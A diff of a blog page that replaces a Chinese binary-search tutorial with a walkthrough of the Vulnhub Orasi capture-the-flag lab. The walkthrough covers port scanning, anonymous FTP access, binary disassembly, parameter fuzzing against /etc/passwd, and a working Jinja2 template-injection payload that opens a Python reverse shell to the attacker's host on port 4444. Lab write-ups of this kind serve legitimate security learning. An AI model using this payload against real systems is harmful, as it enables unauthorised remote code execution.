@@ -4,11 +4,16 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="【基础算法篇】二分, 学习，IT，NLP, 机器学习">
-    <meta name="description" content="背景
-二分排序我在大学学习的时候不以为意 以为这个很简单 直到看了y总的解释才知道我停留在很浅的理解上
+    <meta name="keywords" content="Vulnhub Orasi靶场实战记录, 学习，IT，NLP, 机器学习">
+    <meta name="description" content="环境靶场环境下载地址：ORASI
+开始实战信息收集先扫描得到靶机IP 192.168.113.132
 
-介绍二分程序虽然简单，但是如果写之前不考虑好想要查找的是什么，十有八九会是死循环或者查找错误，就算侥幸写对了也只是运气好而已。用二分去">
+nmap -sP 192.168.113.1/24 
+
+扫描开放端口
+
+nmap -p- -sV -A 192.168.113.132
+">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -16,7 +21,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>【基础算法篇】二分 | Justin博客</title>
+    <title>Vulnhub Orasi靶场实战记录 | Justin博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -264,13 +269,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        【基础算法篇】二分
+                        Vulnhub Orasi靶场实战记录
                     </div>
                 </div>
             </div>
@@ -381,16 +386,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/" target="_blank">
-                                <span class="chip bg-color">算法基础笔记</span>
-                            </a>
-                        
-                            <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95/" target="_blank">
-                                <span class="chip bg-color">数据结构算法</span>
-                            </a>
-                        
-                            <a href="/tags/acwing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80/" target="_blank">
-                                <span class="chip bg-color">acwing算法基础</span>
+                            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" target="_blank">
+                                <span class="chip bg-color">网络安全</span>
                             </a>
                         
                     </div>
@@ -401,8 +398,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/" class="post-category" target="_blank">
-                                算法基础笔记
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category" target="_blank">
+                                网络安全
                             </a>
                         
                     </div>
@@ -413,21 +410,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-05-18
+                    2023-05-25
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        561
+                        1.9k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        2 分
+                        9 分
                     </div>
                     
                 
@@ -443,106 +440,203 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><blockquote>
-<p>二分排序我在大学学习的时候不以为意 以为这个很简单 直到看了y总的解释才知道我停留在很浅的理解上</p>
+                <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>靶场环境下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/orasi-1,660/">ORASI</a></p>
+<h2 id="开始实战"><a href="#开始实战" class="headerlink" title="开始实战"></a>开始实战</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>先扫描得到靶机IP <strong>192.168.113.132</strong></p>
+<blockquote>
+<p>nmap -sP 192.168.113.1/24 </p>
 </blockquote>
-<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>二分程序虽然简单，但是如果写之前不考虑好想要查找的是什么，十有八九会是死循环或者查找错误，就算侥幸写对了也只是运气好而已。用二分去查找元素要求数组的有序性或者拥有类似于有序的性质，对本题而言，一个包含重复元素的有序序列，要求输出某元素出现的起始位置和终止位置</p>
-<p>所以，需要写两个二分，一个需要找到&gt;=x的第一个数，另一个需要找到&lt;=x的最后一个数。</p>
-<ol>
-<li>查找&lt;=x的最后一个位置(也就是寻找左区间)：</li>
-</ol>
-<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">SL</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span>
-<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
-    <span class="token keyword">while</span><span class="token punctuation">(</span>l <span class="token operator">&lt;</span> r<span class="token punctuation">)</span>
-    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
-        <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">>=</span> x<span class="token punctuation">)</span> r <span class="token operator">=</span> mid<span class="token punctuation">;</span>
-        <span class="token keyword">else</span> l <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> l<span class="token punctuation">;</span>
-<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+<p>扫描开放端口</p>
+<blockquote>
+<p>nmap -p- -sV -A 192.168.113.132</p>
+</blockquote>
+<pre><code>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 01:25 EDT
+Nmap scan report for 192.168.113.132
+Host is up (0.00062s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.113.129
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 ftp      ftp          4096 Feb 11  2021 pub
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 8a07938e8ad667fed010881461495a66 (RSA)
+|   256 5acd2531ecf202a8a8ec32c96389b2e3 (ECDSA)
+|_  256 397057ccbb9b6550368d7100a2ac2436 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Site doesn&#39;t have a title (text/html).
+|_http-server-header: Apache/2.4.38 (Debian)
+5000/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.7.3)
+|_http-title: 404 Not Found
+|_http-server-header: Werkzeug/1.0.1 Python/3.7.3
+MAC Address: 00:0C:29:B1:61:BC (VMware)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+</code></pre><p>发现开放了80端口，访问主机ip，发现没有什么特别的东西，就两行字符串，也没有cms之类的站点。而且开放了5000端口的python服务，暂时不知道用处</p>
+<p>内容如下：</p>
+<pre><code>
+Orasi
+
+6 6 1337leet
+
+</code></pre><p>还发现开放了20端口，并且提示<strong>Anonymous FTP login allowed</strong>，匿名用户可以访问，所以尝试登陆上去查看一下</p>
+<blockquote>
+<p>  ftp 192.168.113.132<br>    ls -la</p>
+</blockquote>
+<p>当前文件夹下的文件信息</p>
+<pre><code>drwxr-xr-x    3 ftp      ftp          4096 Feb 11  2021 .
+drwxr-xr-x    3 ftp      ftp          4096 Feb 11  2021 ..
+drwxr-xr-x    2 ftp      ftp          4096 Feb 11  2021 pub
+
+</code></pre><p>发现pub下有个名称叫url文件的，下载到本地查看，并查看该文件。运行后没什么信息</p>
+<pre><code>
+└─# file url           
+url: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ef3648aae50173281b64e2d9f71511b1b4abb0a3, for GNU/Linux 3.2.0, not stripped
+
+</code></pre><p>对其反汇编，用ida也可。这里在kali使用objdump命令，搜索找到main函数</p>
+<pre><code>
+000000000001165 &lt;main&gt;:
+    1165:       55                      push   %rbp
+    1166:       48 89 e5                mov    %rsp,%rbp
+    1169:       bf 08 00 00 00          mov    $0x8,%edi
+    116e:       e8 ed fe ff ff          call   1060 &lt;malloc@plt&gt;
+    1173:       48 89 05 a6 2f 00 00    mov    %rax,0x2fa6(%rip)        # 4120 &lt;init&gt;
+    117a:       48 8b 05 9f 2f 00 00    mov    0x2f9f(%rip),%rax        # 4120 &lt;init&gt;
+    1181:       c6 00 6f                movb   $0x6f,(%rax)
+    1184:       48 8b 05 95 2f 00 00    mov    0x2f95(%rip),%rax        # 4120 &lt;init&gt;
+    118b:       c7 40 04 ff ff ff ff    movl   $0xffffffff,0x4(%rax)
+    1192:       be 2f 00 00 00          mov    $0x2f,%esi
+    1197:       bf 01 00 00 00          mov    $0x1,%edi
+    119c:       e8 0c 01 00 00          call   12ad &lt;insert&gt;
+    11a1:       be 73 00 00 00          mov    $0x73,%esi
+    11a6:       bf 02 00 00 00          mov    $0x2,%edi
+    11ab:       e8 fd 00 00 00          call   12ad &lt;insert&gt;
+    11b0:       be 68 00 00 00          mov    $0x68,%esi
+    11b5:       bf 2a 00 00 00          mov    $0x2a,%edi
+    11ba:       e8 ee 00 00 00          call   12ad &lt;insert&gt;
+    11bf:       be 34 00 00 00          mov    $0x34,%esi
+    11c4:       bf 04 00 00 00          mov    $0x4,%edi
+    11c9:       e8 df 00 00 00          call   12ad &lt;insert&gt;
+    11ce:       be 64 00 00 00          mov    $0x64,%esi
+    11d3:       bf 0c 00 00 00          mov    $0xc,%edi
+    11d8:       e8 d0 00 00 00          call   12ad &lt;insert&gt;
+    11dd:       be 30 00 00 00          mov    $0x30,%esi
+    11e2:       bf 0e 00 00 00          mov    $0xe,%edi
+    11e7:       e8 c1 00 00 00          call   12ad &lt;insert&gt;
+    11ec:       be 77 00 00 00          mov    $0x77,%esi
+    11f1:       bf 11 00 00 00          mov    $0x11,%edi
+    11f6:       e8 b2 00 00 00          call   12ad &lt;insert&gt;
+    11fb:       be 24 00 00 00          mov    $0x24,%esi
+    1200:       bf 12 00 00 00          mov    $0x12,%edi
+    1205:       e8 a3 00 00 00          call   12ad &lt;insert&gt;
+    120a:       be 73 00 00 00          mov    $0x73,%esi
+    120f:       bf 13 00 00 00          mov    $0x13,%edi
+    1214:       e8 94 00 00 00          call   12ad &lt;insert&gt;
+    1219:       48 8d 3d e8 0d 00 00    lea    0xde8(%rip),%rdi        # 2008 &lt;_IO_stdin_used+0x8&gt;
+    1220:       e8 1b fe ff ff          call   1040 &lt;puts@plt&gt;
+    1225:       bf 12 00 00 00          mov    $0x12,%edi
+    122a:       e8 e3 01 00 00          call   1412 &lt;search&gt;
+    122f:       48 89 05 f2 2e 00 00    mov    %rax,0x2ef2(%rip)        # 4128 &lt;item&gt;
+    1236:       48 8b 05 eb 2e 00 00    mov    0x2eeb(%rip),%rax        # 4128 &lt;item&gt;
+    123d:       48 85 c0                test   %rax,%rax
+    1240:       74 22                   je     1264 &lt;main+0xff&gt;
+    1242:       48 8b 05 df 2e 00 00    mov    0x2edf(%rip),%rax        # 4128 &lt;item&gt;
+    1249:       0f b6 00                movzbl (%rax),%eax
+    124c:       0f be c0                movsbl %al,%eax
+    124f:       89 c6                   mov    %eax,%esi
+    1251:       48 8d 3d d1 0d 00 00    lea    0xdd1(%rip),%rdi        # 2029 &lt;_IO_stdin_used+0x29&gt;
+    1258:       b8 00 00 00 00          mov    $0x0,%eax
+    125d:       e8 ee fd ff ff          call   1050 &lt;printf@plt&gt;
+    1262:       eb 0c                   jmp    1270 &lt;main+0x10b&gt;
+    1264:       48 8d 3d d1 0d 00 00    lea    0xdd1(%rip),%rdi        # 203c &lt;_IO_stdin_used+0x3c&gt;
+    126b:       e8 d0 fd ff ff          call   1040 &lt;puts@plt&gt;
+    1270:       b8 00 00 00 00          mov    $0x0,%eax
+    1275:       5d                      pop    %rbp
+    1276:       c3                      ret
+
+</code></pre><p>到这里已经卡主了，查阅网上相关资料提示信息存放在寄存器中，因此这里先把寄存器内容提取出来</p>
+<pre class=" language-text"><code class="language-text"># 寄存器内容
+
+0x2f 0x73 0x68 0x34 0x64 0x30 0x77 0x24 0x73
+
+# 将其转化为二进制并输出
+
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# echo "0x2f 0x73 0x68 0x34 0x64 0x30 0x77 0x24 0x73" | xxd -r
+/sh4d0w$s 
 </code></pre>
-<ol start="2">
-<li>查找&gt;=x的第一个位置(也就是寻找右区间)：</li>
-</ol>
-<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">SR</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span>
-<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
-    <span class="token keyword">while</span><span class="token punctuation">(</span>l <span class="token operator">&lt;</span> r<span class="token punctuation">)</span>
-    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
-        <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> x<span class="token punctuation">)</span> l <span class="token operator">=</span> mid<span class="token punctuation">;</span>
-        <span class="token keyword">else</span> r <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> r<span class="token punctuation">;</span>
-<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+<p>根据<strong>/sh4d0w$s</strong>的格式和web页面的提示，很有可能<strong> /sh4d0w$s </strong> 是一个路径，将其和ip地址拼接并访问，结果是not found。前面信息收集阶段，还有一个5000端口还没用上，访问5000端口并拼接前面的路径</p>
+<p>访问内容如下：</p>
+<pre class=" language-text"><code class="language-text">No input
 </code></pre>
-<h2 id="三-、AC代码"><a href="#三-、AC代码" class="headerlink" title="三 、AC代码"></a>三 、AC代码</h2><pre class=" language-c"><code class="language-c"> <span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
+<p>这里提示了我们需要输入一些内容，很自然想到用get或者post提交，但是不知道提交参数名字，所以这里需要参数爆破（PS：命令下面的FUZZ是）</p>
+<blockquote>
+<p>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u ‘<a target="_blank" rel="noopener" href="http://192.168.113.132:5000/sh4d0w$s?FUZZ=/etc/passwd&#39;">http://192.168.113.132:5000/sh4d0w$s?FUZZ=/etc/passwd&#39;</a> -fs 0,8 </p>
+</blockquote>
+<p>扫描完没有爆破出来，原先web页面还有一个<strong>1337leet</strong>还未使用，可能需要自己创建字典爆破，生成一个6位的由<strong>1337leet</strong>组成的参数字典</p>
+<blockquote>
+<p>crunch 6 6 1337leet &gt; sec.txt </p>
+</blockquote>
+<p>再使用这个字典爆破</p>
+<blockquote>
+<p>ffuf -c -w ./sec.txt  -u ‘<a target="_blank" rel="noopener" href="http://192.168.113.132:5000/sh4d0w$s?FUZZ=/etc/passwd&#39;">http://192.168.113.132:5000/sh4d0w$s?FUZZ=/etc/passwd&#39;</a> -fs 0,8</p>
+</blockquote>
+<p>成功发现！参数是<strong>l333tt</strong></p>
+<pre><code>└─# ffuf -c -w ./sec.txt  -u &#39;http://192.168.113.132:5000/sh4d0w$s?FUZZ=/etc/passwd&#39; -fs 0,8 
 
- using namespace std<span class="token punctuation">;</span>
- <span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">100010</span><span class="token punctuation">;</span>
- <span class="token keyword">int</span> a<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
 
- <span class="token keyword">int</span> <span class="token function">SL</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span>
- <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
-     <span class="token keyword">while</span><span class="token punctuation">(</span>l <span class="token operator">&lt;</span> r<span class="token punctuation">)</span>
-     <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
-         <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">;</span>
-         <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">>=</span> x<span class="token punctuation">)</span> r <span class="token operator">=</span> mid<span class="token punctuation">;</span>
-         <span class="token keyword">else</span> l <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
-     <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
-     <span class="token keyword">return</span> l<span class="token punctuation">;</span>
- <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+       v2.0.0-dev
+________________________________________________
 
- <span class="token keyword">int</span> <span class="token function">SR</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span>
- <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
-     <span class="token keyword">while</span><span class="token punctuation">(</span>l <span class="token operator">&lt;</span> r<span class="token punctuation">)</span>
-     <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
-         <span class="token keyword">int</span> mid <span class="token operator">=</span> l <span class="token operator">+</span> r <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">;</span>
-         <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> x<span class="token punctuation">)</span> l <span class="token operator">=</span> mid<span class="token punctuation">;</span>
-         <span class="token keyword">else</span> r <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
-     <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
- <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+ :: Method           : GET
+ :: URL              : http://192.168.113.132:5000/sh4d0w$s?FUZZ=/etc/passwd
+ :: Wordlist         : FUZZ: /home/kali/Desktop/sec.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response size: 0,8
+________________________________________________
 
- <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
- <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
-     <span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span>
-     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">,</span> <span class="token operator">&amp;</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>
+[Status: 200, Size: 11, Words: 1, Lines: 1, Duration: 167ms]
+    * FUZZ: l333tt
 
-     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i <span class="token operator">++</span> <span class="token punctuation">)</span> <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token keyword">while</span> <span class="token punctuation">(</span>m <span class="token operator">--</span> <span class="token punctuation">)</span>
-     <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
-         <span class="token keyword">int</span> x<span class="token punctuation">;</span>
-         <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre><p>通过测试<strong><a target="_blank" rel="noopener" href="http://192.168.113.132:5000/sh4d0w$s?l333tt=xxx">http://192.168.113.132:5000/sh4d0w$s?l333tt=xxx</a></strong>，发现会回显用户输入的内容。一开始以为是命令行注入漏洞，结果只是重新回显用户返回的内容。</p>
+<p>回顾前面信息收集，5000端口是python程序开启的，python后端很容易存在模板注入漏洞（详细解释<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wjw-zm/p/12741047.html">点击此处</a>），验证一下是否存在模板注入</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://192.168.113.132:5000/sh4d0w$s?l333tt=">http://192.168.113.132:5000/sh4d0w$s?l333tt=</a>36</p>
+</blockquote>
+<p>发现输出36，说明后端对其大括号内的内容做了运算，说明存在模板注入</p>
+<p>这里安利一个服务端payload的 <a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md">github仓库</a>，选择<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---remote-code-execution">远程执行代码</a></p>
+<pre><code>
+&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;&#123;% if "warning" in x.__name__ %&#125;&#123;&#123;x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.113.129\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read()&#125;&#125;&#123;%endif%&#125;&#123;% endfor %&#125;
 
-         <span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token function">SL</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
-         <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">!=</span> x<span class="token punctuation">)</span>
-             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-1 -1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-         <span class="token keyword">else</span>
-             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d %d\n"</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> <span class="token function">SR</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
-     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
- <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
-</code></pre>
-<h2 id="习题-数的三次方根"><a href="#习题-数的三次方根" class="headerlink" title="习题 数的三次方根"></a>习题 数的三次方根</h2><p><a target="_blank" rel="noopener" href="https://www.acwing.com/problem/content/792/">https://www.acwing.com/problem/content/792/</a></p>
-<h3 id="AC代码"><a href="#AC代码" class="headerlink" title="AC代码"></a>AC代码</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iomanip></span></span>
-using namespace std<span class="token punctuation">;</span>
-
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
-    <span class="token keyword">double</span> n<span class="token punctuation">;</span>
-    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>
-    <span class="token keyword">double</span> l <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">10000</span><span class="token punctuation">,</span> r <span class="token operator">=</span> <span class="token number">10000</span><span class="token punctuation">;</span>
-    <span class="token keyword">while</span><span class="token punctuation">(</span>r <span class="token operator">-</span> l <span class="token operator">></span> <span class="token number">1e-7</span><span class="token punctuation">)</span>
-    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
-        <span class="token keyword">double</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span>mid <span class="token operator">*</span> mid <span class="token operator">*</span> mid <span class="token operator">>=</span> n<span class="token punctuation">)</span> r <span class="token operator">=</span> mid<span class="token punctuation">;</span>
-        <span class="token keyword">else</span> l <span class="token operator">=</span> mid<span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
-    cout <span class="token operator">&lt;&lt;</span> fixed <span class="token operator">&lt;&lt;</span> <span class="token function">setprecision</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> l<span class="token punctuation">;</span>
-    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
-</code></pre>
+</code></pre><p>可以看到靶机成功上线</p>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnhub/1orasi/1.png" alt="成功上线"></p>
 
             </div>
             <hr/>
@@ -690,7 +784,7 @@ using namespace std<span class="token punctuation">;</span>
                     </span>
                     <a href="http://www.alexjakin.github.io" class="b-link-green">Justin博客</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2022/05/18/jichusuanfapianerfen/" class="b-link-green">【基础算法篇】二分</a>
+                    <a href="/2023/05/25/vulnhuborasibachangshizhanjilu/" class="b-link-green">Vulnhub Orasi靶场实战记录</a>
                 </p>
             </div>
         </div>
@@ -712,7 +806,7 @@ using namespace std<span class="token punctuation">;</span>
         repo: 'MyBlog',
         owner: 'AlexJakin',
         admin: "AlexJakin",
-        id: '2022-05-18T16-12-01',
+        id: '2023-05-25T13-21-24',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -733,56 +827,52 @@ using namespace std<span class="token punctuation">;</span>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/05/18/jichusuanfapianguibingpaixubiji/">
+                <a href="/2023/05/25/vulnhuborasibachangshizhanjilu/">
                     <div class="card-image">
                         
                         
